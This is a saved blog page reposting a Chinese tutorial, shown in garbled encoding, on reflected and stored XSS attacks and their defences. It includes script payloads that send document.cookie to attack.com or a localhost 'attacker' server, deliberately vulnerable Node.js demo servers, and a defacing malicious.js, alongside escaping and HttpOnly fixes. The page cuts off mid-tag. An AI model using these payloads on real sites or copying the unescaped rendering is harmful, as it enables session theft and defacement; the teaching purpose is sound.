<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>XSSæ”»é˜²å®æˆ˜ï¼ˆé™„JSæºç ï¼‰ | ä¸ªäººä¸»é¡µ</title>
    <meta name="generator" content="VuePress 1.9.9">
    <link rel="icon" href="/img/logo.ico">
    <link rel="apple-touch-icon" href="/img/logo.png">
    <meta name="description" content="rhçš„åšå®¢">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;">
    
    <link rel="preload" href="/assets/css/0.styles.74a02103.css" as="style"><link rel="preload" href="/assets/js/app.f8839a88.js" as="script"><link rel="preload" href="/assets/js/2.8d06e467.js" as="script"><link rel="preload" href="/assets/js/69.158d7968.js" as="script"><link rel="prefetch" href="/assets/js/10.75500dcd.js"><link rel="prefetch" href="/assets/js/11.592669c1.js"><link rel="prefetch" href="/assets/js/12.a9094538.js"><link rel="prefetch" href="/assets/js/13.2cf414ec.js"><link rel="prefetch" href="/assets/js/14.d2737ceb.js"><link rel="prefetch" href="/assets/js/15.8eb8f805.js"><link rel="prefetch" href="/assets/js/16.820d5c80.js"><link rel="prefetch" href="/assets/js/17.801ecbcc.js"><link rel="prefetch" href="/assets/js/18.b2f69842.js"><link rel="prefetch" href="/assets/js/19.15396bbe.js"><link rel="prefetch" href="/assets/js/20.233b2644.js"><link rel="prefetch" href="/assets/js/21.858bfdd0.js"><link rel="prefetch" href="/assets/js/22.38ba5211.js"><link rel="prefetch" href="/assets/js/23.58fbdc70.js"><link rel="prefetch" href="/assets/js/24.15131ce6.js"><link rel="prefetch" href="/assets/js/25.7bce4e07.js"><link rel="prefetch" href="/assets/js/26.b37e74b8.js"><link rel="prefetch" href="/assets/js/27.64d94c4d.js"><link rel="prefetch" href="/assets/js/28.c78dfbd6.js"><link rel="prefetch" href="/assets/js/29.b576a40d.js"><link rel="prefetch" href="/assets/js/3.f9317427.js"><link rel="prefetch" href="/assets/js/30.29554d88.js"><link rel="prefetch" href="/assets/js/31.9af67186.js"><link rel="prefetch" href="/assets/js/32.d380b09a.js"><link rel="prefetch" href="/assets/js/33.eb0839b0.js"><link rel="prefetch" href="/assets/js/34.62b518b9.js"><link rel="prefetch" href="/assets/js/35.429a5bce.js"><link rel="prefetch" href="/assets/js/36.43c4d349.js"><link rel="prefetch" href="/assets/js/37.d6b42aa3.js"><link rel="prefetch" href="/assets/js/38.a7eec5a0.js"><link rel="prefetch" href="/assets/js/39.2f5a06ea.js"><link rel="prefetch" href="/assets/js/4.63a5e966.js"><link rel="prefetch" href="/assets/js/40.dc834d41.js"><link rel="prefetch" href="/assets/js/41.fcc4e1e8.js"><link rel="prefetch" href="/assets/js/42.e57f8aa8.js"><link rel="prefetch" href="/assets/js/43.15534ad1.js"><link rel="prefetch" href="/assets/js/44.eb90d815.js"><link rel="prefetch" href="/assets/js/45.6e206fc8.js"><link rel="prefetch" href="/assets/js/46.285350f5.js"><link rel="prefetch" href="/assets/js/47.cde65c12.js"><link rel="prefetch" href="/assets/js/48.1c870c67.js"><link rel="prefetch" href="/assets/js/49.2b6f4336.js"><link rel="prefetch" href="/assets/js/5.2c45f22c.js"><link rel="prefetch" href="/assets/js/50.1a667582.js"><link rel="prefetch" href="/assets/js/51.600bc042.js"><link rel="prefetch" href="/assets/js/52.2e105d94.js"><link rel="prefetch" href="/assets/js/53.fa0284c4.js"><link rel="prefetch" href="/assets/js/54.0b748f22.js"><link rel="prefetch" href="/assets/js/55.ee05dee1.js"><link rel="prefetch" href="/assets/js/56.21abdcc3.js"><link rel="prefetch" href="/assets/js/57.26ddbf76.js"><link rel="prefetch" href="/assets/js/58.91fd9800.js"><link rel="prefetch" href="/assets/js/59.6022db72.js"><link rel="prefetch" href="/assets/js/6.e9b45abe.js"><link rel="prefetch" href="/assets/js/60.1f2889ae.js"><link rel="prefetch" href="/assets/js/61.46040c7d.js"><link rel="prefetch" href="/assets/js/62.af7e9fcd.js"><link rel="prefetch" href="/assets/js/63.2fb355ca.js"><link rel="prefetch" href="/assets/js/64.99a87693.js"><link rel="prefetch" href="/assets/js/65.005ae6f4.js"><link rel="prefetch" href="/assets/js/66.12940877.js"><link rel="prefetch" href="/assets/js/67.b4a93190.js"><link rel="prefetch" href="/assets/js/68.c8d9d13c.js"><link rel="prefetch" href="/assets/js/7.bbffe35f.js"><link rel="prefetch" href="/assets/js/70.4e4a3ae3.js"><link rel="prefetch" href="/assets/js/71.487c7568.js"><link rel="prefetch" href="/assets/js/72.e2a65bcb.js"><link rel="prefetch" href="/assets/js/8.bda61152.js"><link rel="prefetch" href="/assets/js/9.f87a0e7d.js">
    <link rel="stylesheet" href="/assets/css/0.styles.74a02103.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="ä¸ªäººä¸»é¡µ" class="logo"> <span class="site-name can-hide">ä¸ªäººä¸»é¡µ</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  ä¸»é¡µ
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="åšå®¢æ–‡ç« " class="dropdown-title"><span class="title">åšå®¢æ–‡ç« </span> <span class="arrow down"></span></button> <button type="button" aria-label="åšå®¢æ–‡ç« " class="mobile-dropdown-title"><span class="title">åšå®¢æ–‡ç« </span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/test/" class="nav-link">
  æµ‹è¯•
</a></li><li class="dropdown-item"><!----> <a href="/frontend/" class="nav-link">
  å‰ç«¯
</a></li><li class="dropdown-item"><!----> <a href="/linux/" class="nav-link">
  linux
</a></li><li class="dropdown-item"><!----> <a href="/other/" class="nav-link router-link-active">
  æ‚æ–‡
</a></li><li class="dropdown-item"><!----> <a href="/node/" class="nav-link">
  Node
</a></li><li class="dropdown-item"><!----> <a href="/python/" class="nav-link">
  Python
</a></li></ul></div></div><div class="nav-item"><a href="/readlog.html" class="nav-link">
  é˜…è¯»æ—¥å¿—
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  å…³äº
</a></div> <a href="https://github.com/JoeHR/vuePress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  ä¸»é¡µ
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="åšå®¢æ–‡ç« " class="dropdown-title"><span class="title">åšå®¢æ–‡ç« </span> <span class="arrow down"></span></button> <button type="button" aria-label="åšå®¢æ–‡ç« " class="mobile-dropdown-title"><span class="title">åšå®¢æ–‡ç« </span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/test/" class="nav-link">
  æµ‹è¯•
</a></li><li class="dropdown-item"><!----> <a href="/frontend/" class="nav-link">
  å‰ç«¯
</a></li><li class="dropdown-item"><!----> <a href="/linux/" class="nav-link">
  linux
</a></li><li class="dropdown-item"><!----> <a href="/other/" class="nav-link router-link-active">
  æ‚æ–‡
</a></li><li class="dropdown-item"><!----> <a href="/node/" class="nav-link">
  Node
</a></li><li class="dropdown-item"><!----> <a href="/python/" class="nav-link">
  Python
</a></li></ul></div></div><div class="nav-item"><a href="/readlog.html" class="nav-link">
  é˜…è¯»æ—¥å¿—
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  å…³äº
</a></div> <a href="https://github.com/JoeHR/vuePress-blog" target="_blank" rel="noopener noreferrer" class="repo-link">
    Github
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/other/" aria-current="page" class="sidebar-link">åœˆå¤æ‚åº¦</a></li><li><a href="/other/gitment.html" class="sidebar-link">Gitment</a></li><li><a href="/other/vscodeæ’ä»¶é…ç½®.html" class="sidebar-link">VS Code é…ç½® Vue å¼€å‘ç¯å¢ƒ - Vetur+ESLint+Prettierï¼ˆ2020ï¼‰</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="xssæ”»é˜²å®æˆ˜-é™„jsæºç "><a href="#xssæ”»é˜²å®æˆ˜-é™„jsæºç " class="header-anchor">#</a> XSSæ”»é˜²å®æˆ˜ï¼ˆé™„JSæºç ï¼‰</h2> <p>ä¹”ç‚åŠ› [å‰ç«¯ç“¶å­å›](javascript:void(0)ğŸ˜‰ <em>ä»Šå¤©</em></p> <blockquote><p>æˆæƒè½¬è½½è‡ªï¼šä¹”ç‚åŠ›</p> <p>https://juejin.im/post/6867184627393265677</p></blockquote> <p>ä¹‹å‰å†™è¿‡ä¸¤ç¯‡æ–‡ç« åˆ†åˆ«ä»‹ç»äº† Cookie ï¼šhttps://juejin.im/post/6863377752939036679 å’Œ JSON Web Tokenï¼šhttps://juejin.im/post/6854573220457086984ï¼Œå¾ˆå¤šç½‘ç«™ä¼šåœ¨ç”¨æˆ·ç™»å½•å®Œæ¯•è®¾ç½® Cookie å€¼æˆ–è€…è¿”å›ä¸€ä¸ª Tokenï¼Œè¿™å°±ç›¸å½“äºä»¤ç‰Œï¼Œåªè¦æ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚å¦‚æœé˜²å¾¡ä¸åˆ°ä½ï¼ŒCookie å’Œ Token å¾ˆå®¹æ˜“è¢« XSS æ”»å‡»çªƒå–åˆ°ï¼Œæ­¤æ—¶æ”»å‡»è€…å°±å¯ä»¥å†’å……çœŸå®çš„ç”¨æˆ·ï¼Œåœ¨ç½‘ç«™ä¸­ä¸ºæ‰€æ¬²ä¸ºäº†ã€‚</p> <p>XSS çš„å…¨ç§°å«è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross Site Scriptingï¼‰ï¼Œæ”»å‡»å‡ºç°çš„åŸå› ä¸€èˆ¬æ˜¯å› ä¸º Web ç¨‹åºå¯¹ç”¨æˆ·çš„è¾“å…¥è¿‡æ»¤ä¸è¶³å¯¼è‡´çš„ä¸€ç§æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æŠŠæ¶æ„çš„è„šæœ¬ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¹‹ä¸­ï¼Œå½“å…¶ä»–ç”¨æˆ·æµè§ˆæ—¶å°±ä¼šæ‰§è¡Œå…¶ä¸­çš„æ¶æ„ä»£ç ï¼Œå¯¹å—å®³è€…äº§ç”Ÿå„ç§æ”»å‡»ã€‚XSS ä¸€èˆ¬åˆ†ä¸ºä¸‰ç§ç±»å‹ï¼š</p> <ul><li>åå°„å‹</li> <li>å­˜å‚¨å‹</li> <li>DOMå‹</li></ul> <h2 id="åå°„å‹-xss-æ”»é˜²å®æˆ˜"><a href="#åå°„å‹-xss-æ”»é˜²å®æˆ˜" class="header-anchor">#</a> åå°„å‹ XSS æ”»é˜²å®æˆ˜</h2> <p>åå°„å‹ XSS æ”»å‡»çš„æ¶æ„è„šæœ¬å¹¶æ²¡æœ‰è¢«å­˜å‚¨åˆ°åç«¯æ•°æ®åº“ä¸­ï¼Œè€Œæ˜¯è¯±å¯¼ç”¨æˆ·ç‚¹å‡»æŸä¸ªç²¾å¿ƒæ‹¼æ¥çš„æ¶æ„é“¾æ¥ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p> <h3 id="æ”»å‡»æ¡ˆä¾‹"><a href="#æ”»å‡»æ¡ˆä¾‹" class="header-anchor">#</a> æ”»å‡»æ¡ˆä¾‹</h3> <p>ä¸€ä¸ªå¸¸è§çš„åœºæ™¯æ˜¯ç”¨æˆ·åœ¨æŸç”µå½±ç½‘ç«™æœç´¢ï¼Œå‡å¦‚è¯·æ±‚åœ°å€æ˜¯ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/movies?q=åŠŸå¤«ç†ŠçŒ«
</code></pre></div><p>åœ¨åå°è¿”å›çš„ç»“æœé¡µä¸­ï¼Œä¼šæ˜¾ç¤ºç”¨æˆ·æœç´¢çš„ç”µå½±åï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>ã€ŒåŠŸå¤«ç†ŠçŒ«ã€çš„æœç´¢ç»“æœä¸ºï¼šxxxxxxxxxxxxxxxxxxxxxxx
</code></pre></div><p>æ”»å‡»è€…æ‹¼æ¥äº†ä¸€ä¸ªæåº¦æ¶æ„çš„é“¾æ¥ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/movies?q=åŠŸå¤«ç†ŠçŒ«&lt;script&gt;fetch(`https://attack.com?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>å¦‚æœç”¨æˆ·ç‚¹å‡»äº†è¿™ä¸ªæ¶æ„é“¾æ¥ï¼Œcookie ç«‹é©¬è¢«ç›—ã€‚ä¸‹é¢ç»™å‡º <code>Node.js</code> åç«¯æœåŠ¡å®Œæ•´æºç ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>const http = require('http')const URL = require('url')// HTML æ¨¡æ¿function renderHTML(tpl) {  return `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;/head&gt;&lt;body&gt;${tpl}&lt;/body&gt;&lt;/html&gt;`}// è·¯ç”±åˆ†å‘å™¨const routes = {  'GET /movies': (req, res) =&gt; { // è¢«æ”»å‡»ç½‘ç«™çš„ç”µå½±æœç´¢æ¥å£    const tpl = req.query.q      ? `&lt;h3&gt;ã€Œ${req.query.q}ã€çš„æœç´¢ç»“æœä¸ºï¼š&lt;/h3&gt;${Array(30).fill('x')}`      : `è¯·è¾“å…¥æœç´¢çš„ç”µå½±`    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'GET /cookies': (req, res) =&gt; { // æ”»å‡»è€…åå°æ”¶é›†cookieçš„æ¥å£    console.log(req.query)    res.end()  },}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // è§£æ url  Object.assign(req, { query, path: pathname }) // å¹¶æŠŠ query å’Œ pathname å‚æ•°æ‰©å±•åˆ° req å¯¹è±¡  const route = routes[[method, pathname].join(' ')] // è·å–è·¯ç”±å¤„ç†å‡½æ•°ï¼ˆç­–ç•¥æ¨¡å¼ï¼‰  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // è¢«æ”»å‡»çš„ç½‘ç«™http.createServer(onRequest).listen(4000) // æ”»å‡»è€…æ”¶é›†cookieçš„æœåŠ¡å™¨
</code></pre></div><p>è¿è¡Œä¸Šé¢çš„ä»£ç ï¼Œç„¶åæ‰“å¼€è®¿é—®ä¸‹é¢çš„æ¶æ„é“¾æ¥ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>http://localhost:3000/movies?q=åŠŸå¤«ç†ŠçŒ«&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·çš„ Cookie è¢«å‘é€åˆ°äº†æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚</p> <h3 id="é˜²å¾¡æ–¹æ¡ˆ"><a href="#é˜²å¾¡æ–¹æ¡ˆ" class="header-anchor">#</a> é˜²å¾¡æ–¹æ¡ˆ</h3> <p>é€ æˆåå°„å‹ XSS æ”»å‡»çš„åŸå› å°±æ˜¯æœåŠ¡ç«¯æ²¡è¿‡æ»¤ï¼Œæ‰€ä»¥è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨æœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æ–¹æ¡ˆä¸€èˆ¬æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚ç›´æ¥ç”¨ <code>encodeURIComponent</code> å¯¹æŸ¥è¯¢å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>const tpl = req.query.q  ? `&lt;h3&gt;ã€Œ${encodeURIComponent(req.query.q)}ã€çš„æœç´¢ç»“æœä¸ºï¼š&lt;/h3&gt;${Array(30).fill('x')}`  : `è¯·è¾“å…¥æœç´¢çš„ç”µå½±`
</code></pre></div><p>è¿˜æœ‰ä¸€ç§æ–¹å¼æ˜¯å†™ä¸€ä¸ªå‡½æ•°æ›¿æ¢æ‰é‚£äº› <code>&lt;</code>ã€<code>&amp;</code> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>function encodeHTML(str) {  return str  .replace(/&amp;/g,'&amp;amp;')  .replace(/&quot;/g,'&amp;quot;')  .replace(/'/g,'&amp;apos;')  .replace(/&lt;/g,'&amp;lt;')  .replace(/&gt;/g,'&amp;gt;')}
</code></pre></div><p>å¦å¤–ï¼Œå¦‚æœåç«¯ç™»å½•éªŒè¯æ˜¯åŸºäº Cookie çš„è¯ï¼Œä¸€å®šè¦è®¾ç½®å…¶å±æ€§ä¸º HttpOnlyï¼Œè¿™æ ·æ”»å‡»è€…æ— æ³•åˆ©ç”¨ JS è„šæœ¬è·å–åˆ° Cookie äº†ã€‚</p> <h2 id="å­˜å‚¨å‹-xss-æ”»é˜²å®æˆ˜"><a href="#å­˜å‚¨å‹-xss-æ”»é˜²å®æˆ˜" class="header-anchor">#</a> å­˜å‚¨å‹ XSS æ”»é˜²å®æˆ˜</h2> <p>ä¸åå°„å‹ä¸åŒï¼Œå­˜å‚¨å‹ XSS æ”»å‡»æ˜¯æŒ‡å½“ç”¨æˆ·çš„è¾“å…¥åŒ…å«äº†æ¶æ„è„šæœ¬ï¼ŒæœåŠ¡ç«¯è½¬ä¹‰å°±å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œè®¿é—®é¡µé¢ä¼šè§¦å‘æ¶æ„è„šæœ¬æ‰§è¡Œï¼Œè€Œå¯¼è‡´çš„æ”»å‡»ã€‚</p> <h3 id="æ”»å‡»æ¡ˆä¾‹-2"><a href="#æ”»å‡»æ¡ˆä¾‹-2" class="header-anchor">#</a> æ”»å‡»æ¡ˆä¾‹</h3> <p>å‡å¦‚åœ¨æŸç½‘ç«™ä¸Šæœ‰ä¸€ç¯‡çˆ†æ¬¾æ–‡ç« ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>https://xxx.com/articles/1
</code></pre></div><p>æ”»å‡»è€…åœ¨æ–‡ç« ä¸‹é¢å‘è¡¨äº†ä¸€ç¯‡è¯„è®ºï¼Œå†…å®¹ä¸­åŒ…å«äº† script è„šæœ¬ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>æ–‡ç« å†™çš„çœŸæ£’ï¼&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>å¦‚æœæœåŠ¡ç«¯ç›´æ¥æŠŠè¯„è®ºå­—ç¬¦ä¸²ä¿å­˜åˆ°æ•°æ®åº“äº†ï¼Œä¸‹æ¬¡åªè¦æœ‰ç”¨æˆ·è®¿é—®è¯¥æ–‡ç« æ—¶ï¼ŒåŒ…å«æ¶æ„è„šæœ¬çš„è¯„è®ºå†…å®¹è¢«è¿”å›ï¼ŒæŠŠå½“å‰ç”¨æˆ·çš„ cookie å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ä¸‹é¢æ˜¯å®Œæ•´çš„ <code>Node.js</code> æœåŠ¡ç«¯æºç ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>const http = require('http')const URL = require('url')const qs = require('querystring')// æ¨¡æ‹Ÿæ–‡ç« æ•°æ®åº“const article = {  id: 1,  title: 'ä½“è‚²æ–°é—»',  content:    'ç«ç®­åœ¨å¯¹é˜µé›·éœ†é¦–è½®ç³»åˆ—èµ›çš„ç¬¬5åœºæ¯”èµ›ä¸­ä»¥114-80æˆ˜èƒœå¯¹æ‰‹ï¼Œä½†åœ¨è¿™åœºæ¯”èµ›ä¸­æ›´å—å…³æ³¨çš„è¿˜æ˜¯ä¸¹å°¼æ–¯-æ–½ç½—å¾·å’ŒPJå¡”å…‹ä¹‹é—´çš„å†²çªå¯¼è‡´ä¸¤äººéƒ½è¢«é©±é€ï¼Œå½“ç„¶ï¼Œåœ¨è¿™åœºæ¯”èµ›ä¹‹åç«ç®­å·²ç»æ‰‹æ¡3-2çš„é¢†å…ˆä¼˜åŠ¿ã€‚',  comments: ['è¯„è®º1', 'è¯„è®º2'],}// HTML æ¨¡æ¿function renderHTML(tpl) {  return `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;/&gt;&lt;/head&gt;&lt;body&gt;${tpl}&lt;/body&gt;&lt;/html&gt;`}// è·¯ç”±åˆ†å‘å™¨const routes = {  'GET /articles/1': (req, res) =&gt; {    const tpl = `    &lt;div style=&quot;width: 500px;margin: auto;&quot;&gt;      &lt;h1&gt;${article.title}&lt;/h1&gt;      &lt;p&gt;${article.content}&lt;/p&gt;      &lt;h3&gt;è¯„è®ºåŒº&lt;/h3&gt;      &lt;ul&gt;${article.comments        .map((item) =&gt; '&lt;li&gt;' + item + '&lt;/li&gt;')        .join('')}&lt;/ul&gt;      &lt;hr/&gt;      &lt;p&gt;è¯·å‘è¡¨æ‚¨çš„è¯„è®ºï¼š&lt;/p&gt;      &lt;form action=&quot;/comments&quot; method=&quot;post&quot;&gt;        &lt;textarea lines=&quot;3&quot; maxlength=&quot;1000&quot; name=&quot;comment&quot; &gt;&lt;/textarea&gt;        &lt;button type=&quot;submit&quot;&gt;æäº¤&lt;/button&gt;      &lt;/form&gt;    &lt;/div&gt;    `    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])    res.end(renderHTML(tpl))  },  'POST /comments': async (req, res) =&gt; {    let body = await getBody(req)    let { comment = '' } = qs.parse(body)    comment = comment.trim()    if (comment) { // ä¸ºé˜²æ­¢å†…å­˜æº¢å‡ºï¼Œåªä¿ç•™æœ€æ–°10æ¡è¯„è®º      article.comments = [comment, ...article.comments.slice(0, 9)]    }    res.writeHead(301, { Location: '/articles/1' })    res.end()  },  'GET /cookies': (req, res) =&gt; {    console.log(req.query)    res.end()  },  'GET /malicious.js': (req, res) =&gt; {    const script = `document.body.innerHTML = 'ç¾å¥³è·æ£ºåœ¨çº¿ç™¼ç‰Œ&lt;img width=200 src=&quot;http://img.zlib.cn/beauty/1.jpg&quot; /&gt;'`    res.end(script)  },}// è·å– req.bodyfunction getBody(req) {  return new Promise((resolve, reject) =&gt; {    const arr = []    req      .on('data', (data) =&gt; arr.push(data))      .on('end', () =&gt;resolve(decodeURIComponent(Buffer.concat(arr).toString())))      .on('error', reject)  })}function onRequest(req, res) {  const { url, method } = req  const { query, pathname } = URL.parse(url, true) // è§£æ url  Object.assign(req, { query, path: pathname }) // å¹¶æŠŠ query å’Œ pathname å‚æ•°æ‰©å±•åˆ° req å¯¹è±¡  const route = routes[[method, pathname].join(' ')] // è·å–è·¯ç”±å¤„ç†å‡½æ•°ï¼ˆç­–ç•¥æ¨¡å¼ï¼‰  if (route) return route(req, res)  res.statusCode = 404  res.end('Not Found')}http.createServer(onRequest).listen(3000) // è¢«æ”»å‡»çš„ç½‘ç«™http.createServer(onRequest).listen(4000) // æ”»å‡»è€…æ”¶é›†cookieçš„æœåŠ¡å™¨
</code></pre></div><p>è¿è¡Œä¸Šé¢çš„ä»£ç ï¼Œç„¶åæ‰“å¼€ç½‘ç«™ <code>http://localhost:3000/articles/1</code>ï¼Œå‘è¡¨ä¸€åˆ™è¯„è®ºï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>æ–‡ç« å†™çš„çœŸæ£’ï¼&lt;script&gt;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·çš„ Cookie é©¬ä¸Šè¢«å‘é€åˆ°äº†æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚å…¶å®è¿™ç§è·å– Cookie çš„æ–¹å¼è¿˜ç®—å°æ‰“å°é—¹äº†ï¼Œåªè¦èƒ½å¤Ÿåˆ©ç”¨ xss æ³¨å…¥ scriptï¼Œé»‘å®¢çœŸçš„æ˜¯å¯ä»¥ã€Œä¸ºæ‰€æ¬²ä¸ºã€ï¼Œä¾‹å¦‚é»‘å®¢é€šè¿‡æ“ä½œ DOM çš„æ–¹å¼ï¼Œåˆ†åˆ†é’ŸæŠŠä½ çš„ç½‘ç«™å˜æˆèµŒåšç½‘ç«™ã€è‰²æƒ…ç½‘ç«™...ï¼Œä¸ä¿¡çš„è¯ä½ è¾“å…¥ä¸‹é¢çš„è¯„è®ºè¯•è¯•ï¼ˆå†…å«ç¦åˆ©ï¼‰ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>æ–‡ç« å†™çš„çœŸæ£’ï¼&lt;script src=&quot;http://localhost:4000/malicious.js&quot;&gt;&lt;/script&gt;
</code></pre></div><p>åœ¨è¿™ä¸ªæ¶æ„è„šæœ¬ <code>malicious.js</code> é‡Œé¢ï¼Œç›´æ¥æ”¹æ‰äº† bodyï¼Œæƒ³æƒ³çœ‹ï¼Œæ‰€æœ‰è®¿é—®ä½ çš„ç½‘ç«™çš„ç”¨æˆ·ï¼Œçœ‹åˆ°çš„å…¶å®æ˜¯å¦å¤–ä¸€ç•ªæ™¯è±¡ï¼Œå¤ªå“äººäº†ã€‚</p> <h3 id="é˜²å¾¡æ–¹æ¡ˆ-2"><a href="#é˜²å¾¡æ–¹æ¡ˆ-2" class="header-anchor">#</a> é˜²å¾¡æ–¹æ¡ˆ</h3> <p>å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨å‹ XSS ä¹Ÿæ˜¯å› ä¸ºæ¶æ„ä»£ç æœªç»è½¬ä¹‰ç›´æ¥è¢«æ’å…¥åˆ°å“åº”çš„ HTML é‡Œçš„ï¼Œç„¶åè¢«æµè§ˆå™¨æ‰§è¡Œå¯¼è‡´æ”»å‡»ï¼Œæ‰€ä»¥è§£å†³æ–¹æ¡ˆä¹Ÿæ˜¯å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œè¿‡æ»¤æ–¹æ¡ˆä¸ä¸Šé¢è®²çš„åå°„å‹ä¸€è‡´ï¼Œå¯ä»¥æ ¹æ®éœ€è¦é€‰æ‹©è¿‡æ»¤æ—¶æœºï¼Œä¾‹å¦‚ï¼š</p> <ul><li>å®¢æˆ·ç«¯æäº¤å‰è¿›è¡Œæ ¡éªŒè¿‡æ»¤ï¼Œå¦‚æœåŒ…å«æ¶æ„è„šæœ¬åˆ™ä¸æäº¤ï¼Œæˆ–è€…æäº¤è½¬ä¹‰åçš„å­—ç¬¦ä¸²</li> <li>æœåŠ¡ç«¯æ¥æ”¶åå…ˆæ ¡éªŒè¿‡æ»¤ï¼Œå¦‚æœåŒ…å«æ¶æ„è„šæœ¬åˆ™ä¸å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œæˆ–è€…å­˜å‚¨è½¬ä¹‰åçš„å­—ç¬¦ä¸²</li> <li>å®¢æˆ·ç«¯æ¸²æŸ“æ—¶å€™è¿›è¡Œè¿‡æ»¤ï¼Œå³ä½¿æ•°æ®åº“ä¸­å­˜å‚¨äº†æœªç»è½¬ä¹‰çš„æ¶æ„è„šæœ¬ï¼Œè¾“å‡ºè½¬ä¹‰åçš„å­—ç¬¦ä¸²</li></ul> <h2 